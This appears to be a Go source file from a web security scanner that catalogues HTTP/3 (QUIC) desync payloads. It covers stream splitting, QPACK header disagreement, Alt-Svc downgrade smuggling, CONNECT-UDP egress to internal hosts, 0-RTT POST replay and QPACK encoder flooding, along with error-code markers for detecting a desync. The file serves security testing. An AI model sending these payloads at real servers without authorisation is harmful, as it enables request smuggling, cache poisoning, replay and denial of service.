// Package http3desync provides HTTP/3 (QUIC) request-desync payloads.
//
// HTTP/3 inherits HTTP/2's frame-level structure but moves transport to
// QUIC streams. The desync surface is similar in shape to H2 desync
// (PortSwigger 2023 "HTTP/2 the sequel is always worse") but with
// QUIC-specific twists: stream-level desync via early-close, QPACK
// header-block desync (vs HPACK), and Alt-Svc downgrade attacks where
// a front-end advertises H3 but the backend speaks H2 — opening a
// protocol-version smuggle.
//
// Source: PortSwigger HTTP/3 research, F5 / Cloudflare HTTP/3 deploy
// guides (Alt-Svc downgrade is documented as a deployment gotcha),
// QUIC-WG draft-ietf-quic-http appendix on multiplexing pitfalls.
package http3desync

// Technique identifies the desync mechanism.
type Technique string

const (
	// TechStreamSplit aborts a stream after the headers but before any
	// CRLF that bounds the body, hoping the back-end appends a
	// subsequent stream's data onto the request.
	TechStreamSplit Technique = "stream_split"
	// TechQPACKDesync sends a QPACK-encoded header block whose decoded
	// length disagrees with the wire length — front-end and back-end
	// disagree on where the headers end.
	TechQPACKDesync Technique = "qpack_desync"
	// TechAltSvcDowngrade uses the Alt-Svc / SVCB mechanism to force a
	// downgrade from H3 to H2 (or H1), then smuggles via the lower
	// version's desync surface.
	TechAltSvcDowngrade Technique = "alt_svc_downgrade"
	// TechConnectUDP smuggles into the CONNECT-UDP extension (RFC 9298)
	// which is gated on the proxy parsing the masque pseudo-headers
	// correctly; many proxy implementations forward the body uninspected.
	TechConnectUDP Technique = "connect_udp_smuggle"
	// TechZeroRTTReplay exercises the 0-RTT replay window. Spec says
	// idempotent requests only; servers that accept POST in 0-RTT lose
	// replay protection.
	TechZeroRTTReplay Technique = "zerortt_replay"
	// TechHeaderListSizeFlood exploits SETTINGS_MAX_FIELD_SECTION_SIZE
	// disagreement between front-end and back-end.
	TechHeaderListSizeFlood Technique = "header_list_size_flood"
)

// Impact classifies the consequence of a successful desync.
type Impact string

const (
	// ImpactSmuggle is full request smuggling: the attacker prepends a
	// request onto a victim's connection.
	ImpactSmuggle Impact = "request_smuggle"
	// ImpactCachePoison achieves cache poisoning via the desync but no
	// arbitrary smuggle.
	ImpactCachePoison Impact = "cache_poison"
	// ImpactDoS is connection-level resource exhaustion (stream flood,
	// header section overflow, …).
	ImpactDoS Impact = "dos"
	// ImpactInfoLeak is when desync exposes another tenant's request
	// (in shared-tenant proxies) but does not let the attacker write.
	ImpactInfoLeak Impact = "info_leak"
)

// Payload represents one HTTP/3 desync attempt.
type Payload struct {
	Name        string
	Technique   Technique
	Impact      Impact
	Description string
	// FrameSeq is a wire-level description of the QUIC frame sequence
	// the runner produces, in the same human-readable shape used by
	// PortSwigger's HTTP/2 desync payloads.
	FrameSeq string
	// FrontendVersion is the HTTP version the front-end is expected to
	// see ("h3" / "h2" / "h1"). The back-end version it desyncs into
	// is implicit from the technique.
	FrontendVersion string
}

// GetPayloads returns all HTTP/3 desync payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByTechnique returns payloads filtered by technique class.
func GetByTechnique(t Technique) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Technique == t {
			out = append(out, p)
		}
	}
	return out
}

// DiscoveryHeaders returns the HTTP/3-advertisement headers the
// discovery layer looks for to confirm a target speaks H3 before any
// desync probe fires.
func DiscoveryHeaders() []string {
	return []string{
		"Alt-Svc",       // h3=":443"; ma=86400
		"Alt-Svc-Hash",  // proposed
		"alt-svc",       // case-insensitive
	}
}

// FrameMarkers returns substrings the scanner watches for in QUIC
// connection close codes and HTTP/3 error frames to confirm a desync
// signal landed without going to active exploitation.
func FrameMarkers() []string {
	return []string{
		"H3_FRAME_UNEXPECTED",
		"H3_FRAME_ERROR",
		"H3_GENERAL_PROTOCOL_ERROR",
		"H3_ID_ERROR",
		"H3_SETTINGS_ERROR",
		"H3_REQUEST_INCOMPLETE",
		"H3_MESSAGE_ERROR",
		"H3_REQUEST_REJECTED",
		"QPACK_DECOMPRESSION_FAILED",
		"QPACK_ENCODER_STREAM_ERROR",
		"QPACK_DECODER_STREAM_ERROR",
		"FRAME_ENCODING_ERROR",
		"H3_NO_ERROR",       // sometimes returned with content desync
		"H3_INTERNAL_ERROR", // back-end gave up parsing
	}
}

var payloads = []Payload{
	// --- Stream-split (early FIN) ---
	{
		Name:            "h3-stream-split-early-fin",
		Technique:       TechStreamSplit,
		Impact:          ImpactSmuggle,
		Description:     "HEADERS frame followed by FIN before the DATA frame the Content-Length implies. Back-end may use the next stream's bytes as continuation.",
		FrameSeq:        "HEADERS(stream=4, CL=10) FIN | next stream's body bytes",
		FrontendVersion: "h3",
	},
	{
		Name:            "h3-stream-split-half-data",
		Technique:       TechStreamSplit,
		Impact:          ImpactSmuggle,
		Description:     "HEADERS + partial DATA frame with FIN set; CL says more bytes are coming. Disagreement opens the smuggle window.",
		FrameSeq:        "HEADERS(CL=20) DATA(8 bytes, FIN)",
		FrontendVersion: "h3",
	},

	// --- QPACK desync ---
	{
		Name:            "qpack-double-cookie",
		Technique:       TechQPACKDesync,
		Impact:          ImpactSmuggle,
		Description:     "Duplicate Cookie header in QPACK: front-end concatenates per RFC 9114 §4.1.1.2, back-end takes first/last. Cookie boundary disagreement = session-fixation smuggle.",
		FrameSeq:        "HEADERS [:method=GET, cookie=A, cookie=B]",
		FrontendVersion: "h3",
	},
	{
		Name:            "qpack-host-vs-authority",
		Technique:       TechQPACKDesync,
		Impact:          ImpactSmuggle,
		Description:     ":authority + Host header set to different values. Spec §4.3.4 requires consistency check; many back-ends use one or the other.",
		FrameSeq:        "HEADERS [:authority=victim.com, host=attacker.com]",
		FrontendVersion: "h3",
	},
	{
		Name:            "qpack-pseudo-after-regular",
		Technique:       TechQPACKDesync,
		Impact:          ImpactSmuggle,
		Description:     "Pseudo-header (:path, :method) emitted AFTER a regular header. Spec says abort; lenient back-ends reorder.",
		FrameSeq:        "HEADERS [user-agent=x, :method=GET, :path=/admin]",
		FrontendVersion: "h3",
	},

	// --- Alt-Svc downgrade chain ---
	{
		Name:            "altsvc-h3-to-h2-cl-te",
		Technique:       TechAltSvcDowngrade,
		Impact:          ImpactSmuggle,
		Description:     "Connect via H3 (front-end advertised), then submit a classic CL.TE smuggle. Front-end translates to H2 and forwards the Transfer-Encoding header to a back-end that honours it.",
		FrameSeq:        "H3 HEADERS [content-length, transfer-encoding=chunked] then chunked body",
		FrontendVersion: "h3",
	},
	{
		Name:            "altsvc-h3-to-h1-version-skew",
		Technique:       TechAltSvcDowngrade,
		Impact:          ImpactCachePoison,
		Description:     "H3 front-end pretranslates to H1 toward back-end. Compression / encoding negotiated under H3 doesn't apply to H1 path; cache key skew opens poisoning window.",
		FrameSeq:        "H3 HEADERS [vary=accept-encoding] requesting gzip → H1 GET /vary",
		FrontendVersion: "h3",
	},

	// --- CONNECT-UDP smuggle ---
	{
		Name:            "connect-udp-pseudo-bypass",
		Technique:       TechConnectUDP,
		Impact:          ImpactSmuggle,
		Description:     "CONNECT-UDP target masked behind a pseudo-header that the front-end inspects but the masque proxy doesn't validate. Allows arbitrary UDP egress from inside the trust boundary.",
		FrameSeq:        "HEADERS [:method=CONNECT, :protocol=connect-udp, :authority=internal:53]",
		FrontendVersion: "h3",
	},

	// --- 0-RTT replay ---
	{
		Name:            "zerortt-replay-post",
		Technique:       TechZeroRTTReplay,
		Impact:          ImpactSmuggle,
		Description:     "Submit a POST request in 0-RTT. Spec mandates idempotent-only acceptance; servers that process it lose replay protection — an on-path attacker can resend captured 0-RTT data.",
		FrameSeq:        "0-RTT crypto frame containing HEADERS [:method=POST, :path=/transfer]",
		FrontendVersion: "h3",
	},

	// --- Field section size ---
	{
		Name:            "field-section-size-mismatch",
		Technique:       TechHeaderListSizeFlood,
		Impact:          ImpactDoS,
		Description:     "Send a HEADERS frame whose decoded size exceeds back-end SETTINGS_MAX_FIELD_SECTION_SIZE but is below front-end's. Front-end accepts, back-end rejects after partial processing, leaks state.",
		FrameSeq:        "SETTINGS_MAX_FIELD_SECTION_SIZE = 8KiB; submit 16KiB header section",
		FrontendVersion: "h3",
	},
	{
		Name:            "qpack-encoder-stream-overflow",
		Technique:       TechHeaderListSizeFlood,
		Impact:          ImpactDoS,
		Description:     "Flood the unidirectional QPACK encoder stream with table updates the decoder cannot drain. Memory pressure with no per-request quota.",
		FrameSeq:        "QPACK encoder stream: N × Insert With Name Reference, never Section ACK",
		FrontendVersion: "h3",
	},

	// --- Misc spec-corners ---
	{
		Name:            "h3-trailer-injection",
		Technique:       TechStreamSplit,
		Impact:          ImpactSmuggle,
		Description:     "Trailer HEADERS frame after FIN, containing a smuggled Set-Cookie. Some caches index by request headers only; trailers ride free.",
		FrameSeq:        "HEADERS, DATA, HEADERS(trailers=true, set-cookie=admin)",
		FrontendVersion: "h3",
	},
}
